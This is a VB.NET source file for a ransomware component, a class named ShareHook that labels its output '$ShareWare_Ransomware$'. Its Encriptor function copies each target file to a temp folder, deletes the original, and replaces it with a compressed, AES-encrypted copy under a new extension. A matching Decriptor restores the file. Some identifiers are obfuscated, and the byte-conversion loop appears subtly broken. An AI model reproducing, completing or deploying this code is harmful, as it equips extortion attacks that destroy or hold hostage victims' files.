Imports Shareware.Core.LogFuncs
Imports Shareware.Compression
Imports System.Text.RegularExpressions

Namespace Shareware.core

    Public Class ShareHook

        Public UFuncsEx As New Shareware.core.UFuncs

        Public Function Encriptor(ByVal FileE As String) As Boolean
            Dim FileName As String = System.IO.Path.GetFileName(FileE)

            Dim FuleRute As String = System.IO.Path.GetDirectoryName(FileE)

            If System.IO.File.Exists(FileE) = True Then
                If My.Computer.FileSystem.FileExists(Shareware.core.DirPaths.TempPath & FileName) = True Then
                    My.Computer.FileSystem.DeleteFile(Shareware.core.DirPaths.TempPath & FileName)
                End If
                System.IO.File.Copy(FileE, Shareware.core.DirPaths.TempPath & FileName)

                My.Computer.FileSystem.DeleteFile(FileE)

                Dim input As New System.IO.FileStream(Shareware.core.DirPaths.TempPath & FileName, System.IO.FileMode.Open, System.IO.FileAccess.Read)
                Dim reader As New System.IO.BinaryReader(input)
                Dim bytes() As Byte = reader.ReadBytes(CInt(input.Length))

                Dim hexCompress As String = CompressedData(BytesToString(bytes))

                Dim Dcrypthook As New Crypto()

                Dim CriptFile As String = Dcrypthook.AES_Encrypt(hexCompress, UFuncsEx.EncodeBase64(Shareware.core.DirPaths.strPass))

                Dim RuteNew As String = FuleRute & "\" & FileName & Shareware.core.DirPaths.ExtensionDefaul

                Dim TxtFile As System.IO.StreamWriter
                TxtFile = My.Computer.FileSystem.OpenTextFileWriter(RuteNew, True)
                TxtFile.WriteLine(CriptFile)
                TxtFile.WriteLine("$ShareWare_Ransomware$")
                TxtFile.WriteLine("#" & FileName)
                TxtFile.Close()
                Return True
            End If
            Return False
        End Function

        Public Function Decriptor(ByVal FileE As String) As Boolean
            Try
                Dim FileName As String = System.IO.Path.GetFileName(FileE)

                Dim FuleRute As String = System.IO.Path.GetDirectoryName(FileE)

                If System.IO.File.Exists(FileE) = True Then
                    If My.Computer.FileSystem.FileExists(Shareware.core.DirPaths.TempPath & FileName) = True Then
                        My.Computer.FileSystem.DeleteFile(Shareware.core.DirPaths.TempPath & FileName)
                    End If
                    System.IO.File.Copy(FileE, Shareware.core.DirPaths.TempPath & FileName)

                    My.Computer.FileSystem.DeleteFile(FileE)

                    Dim FileDecriptName As String = String.Empty
                    Dim StringToFile As String = String.Empty
                    Dim ProcessText As String = String.Empty

                    Dim TxtFile As System.IO.StreamReader
                    TxtFile = My.Computer.FileSystem.OpenTextFileReader(Shareware.core.DirPaths.TempPath & FileName)
                    ProcessText = TxtFile.ReadToEnd()
                    TxtFile.Close()

                    ' ProcessText = System.IO.File.ReadAllText(Shareware.core.DirPaths.TempPath & FileName)

                    Dim ProxText() As String = ProcessText.Split("#")
                    FileDecriptName = ProxText(1)

                    ProcessText = ProcessText.Replace("$ShareWare_Ransomware$", Nothing)
                    ProcessText = ProcessText.Replace("#" & FileDecriptName, Nothing)

                    Dim Dcrypthook As New Crypto()

                    Dim DeText As String = ProcessText 'New System.IO.StringReader(ProcessText).ReadLine()

                    Dim DcriptFile As String = Dcrypthook.AES_Decrypt(DeText, UFuncsEx.EncodeBase64(Shareware.core.DirPaths.strPass))

                    Dim RuteNew As String = FuleRute & "\" & FixPath(FileDecriptName)

                    Dim HexDecompress As String = DecompressData(DcriptFile)
                   
                    System.IO.File.WriteAllBytes(RuteNew, KHwGeygjHq(HexDecompress))

                    If My.Computer.FileSystem.FileExists(Shareware.core.DirPaths.TempPath & FileName) = True Then
                        My.Computer.FileSystem.FileExists(Shareware.core.DirPaths.TempPath & FileName)
                    End If

                    Return True

                End If
            Catch ex As Exception

                Return False
            End Try
            Return False
        End Function

        Private Function FixPath(ByVal illegal As String) As String
            Return String.Join("", illegal.Split(System.IO.Path.GetInvalidFileNameChars()))
        End Function

        Public Function KHwGeygjHq(ByVal KMvWYyQigLibcI As String) As Byte()
            Dim cKHbugadWMVB
            Dim WdfGomorOa() As Byte
            KMvWYyQigLibcI = Microsoft.VisualBasic.Strings.Replace(KMvWYyQigLibcI, " ", "")
            ReDim WdfGomorOa((Microsoft.VisualBasic.Strings.Len(KMvWYyQigLibcI) \ 2) - 1)
            For cKHbugadWMVB = 0 To Microsoft.VisualBasic.Information.UBound(WdfGomorOa) - 2
                WdfGomorOa(cKHbugadWMVB) = CLng("&H" & Microsoft.VisualBasic.Strings.Mid$(KMvWYyQigLibcI, 2 * cKHbugadWMVB + 1, 2))
            Next
            KHwGeygjHq = WdfGomorOa
        End Function

        Public Shared Function BytesToString(ByVal Input As Byte()) As String
            Dim Result As New System.Text.StringBuilder(Input.Length * 2)
            Dim Part As String
            For Each b As Byte In Input
                Part = Conversion.Hex(b)
                If Part.Length = 1 Then Part = "0" & Part
                Result.Append(Part)
            Next
            Return Result.ToString()
        End Function

        Public Function CheckForBinary(ByVal FilePath As String) As Boolean
            Dim objStream As System.IO.Stream = New System.IO.FileStream(FilePath, System.IO.FileMode.Open, System.IO.FileAccess.Read)
            Dim bFlag As Boolean = True

            For nPosition As Integer = 0 To objStream.Length - 1
                Dim a As Integer = objStream.ReadByte()

                If Not (a >= 0 AndAlso a <= 127) Then
                    bFlag = True 'Binary File
                ElseIf objStream.Position = (objStream.Length) Then
                    bFlag = False 'Text File
                End If
            Next

            objStream.Dispose()
            objStream.Close()
            Return bFlag
        End Function

    End Class

End Namespace

